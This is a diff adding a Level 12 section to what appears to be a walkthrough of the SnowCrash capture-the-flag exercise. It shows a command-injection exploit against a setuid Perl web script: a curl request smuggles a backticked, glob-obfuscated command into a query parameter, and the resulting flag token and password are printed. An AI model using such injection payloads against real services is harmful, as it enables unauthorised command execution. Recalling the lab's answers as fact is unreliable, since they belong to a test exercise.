@@ -430,3 +430,23 @@ Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 ```
 
 After that we have to log with `level12` and give the password `fa6v5ateaw21peobuub8ipe6s`.
+
+## Level 12
+
+In this one, we have a [perl](https://fr.wikipedia.org/wiki/Perl_(langage)) script like the level 04.
+
+```bash
+level12@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
+```
+
+```bash
+level12@SnowCrash:~$ echo "getflag > /tmp/answer" > /tmp/TEST && chmod +x /tmp/TEST
+level12@SnowCrash:~$ curl 'http://127.0.0.1:4646/?x=`/*/test`'
+level12@SnowCrash:~$ cat /tmp/answer
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+```
+When you cat the file we can see some regex.
+
+After that we have to log with `level13` and give the password `g1qKMiRpXf53AWhDaU7FEkczr`.
